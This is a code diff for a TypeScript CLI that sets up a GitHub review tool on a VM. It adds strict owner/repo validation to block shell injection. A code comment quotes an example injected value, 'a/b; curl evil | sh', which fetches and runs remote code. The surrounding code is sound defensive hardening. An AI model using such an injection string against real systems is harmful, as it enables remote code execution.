@@ -27,6 +27,11 @@ function bail<T>(value: T | symbol): asserts value is T {
   }
 }
 
+function die(message: string): never {
+  log.error(message)
+  process.exit(1)
+}
+
 function which(bin: string): string | null {
   return Bun.which(bin)
 }
@@ -50,7 +55,14 @@ function detectRepo(): string | null {
     .replace(/^[a-z]+:\/\/[^/]+\//, '')
     .replace(/^git@[^:]+:/, '')
     .replace(/\.git$/, '')
-  return /^[^/]+\/[^/]+$/.test(slug) ? slug : null
+  return validRepo(slug) ? slug : null
+}
+
+// Strict owner/repo — GitHub names are word chars / dot / hyphen only. This is also a security boundary:
+// `repo` is interpolated into a shell setup-script that runs on the VM, so anything looser than this would
+// let `a/b; curl evil | sh` through.
+function validRepo(r: string): boolean {
+  return /^[\w.-]+\/[\w.-]+$/.test(r)
 }
 
 function installCron(opts: { ghHost: string }): string {
@@ -105,11 +117,12 @@ async function setup(argv: { repo?: string; host?: string; yes: boolean }): Prom
     const answer = await text({
       message: 'GitHub repo to review',
       placeholder: 'owner/repo',
-      validate: (v) => (/^[^/]+\/[^/]+$/.test((v ?? '').trim()) ? undefined : 'expected owner/repo'),
+      validate: (v) => (validRepo((v ?? '').trim()) ? undefined : 'expected owner/repo'),
     })
     bail(answer)
     repo = answer.trim()
   }
+  if (!validRepo(repo)) die(`'${repo}' is not a valid owner/repo`)
 
   // 3. integration host (exe.dev) — can't be detected
   let host = argv.host ?? process.env.GH_HOST ?? ''
@@ -237,11 +250,12 @@ async function provision(argv: { repo?: string; yes: boolean }): Promise<void> {
     const answer = await text({
       message: 'GitHub repo to review',
       placeholder: 'owner/repo',
-      validate: (v) => (/^[^/]+\/[^/]+$/.test((v ?? '').trim()) ? undefined : 'expected owner/repo'),
+      validate: (v) => (validRepo((v ?? '').trim()) ? undefined : 'expected owner/repo'),
     })
     bail(answer)
     repo = answer.trim()
   }
+  if (!validRepo(repo)) die(`'${repo}' is not a valid owner/repo`)
 
   // 3. GitHub integration — reuse an existing one, else create it (needs your GitHub linked once, on the web)
   const s2 = spinner()
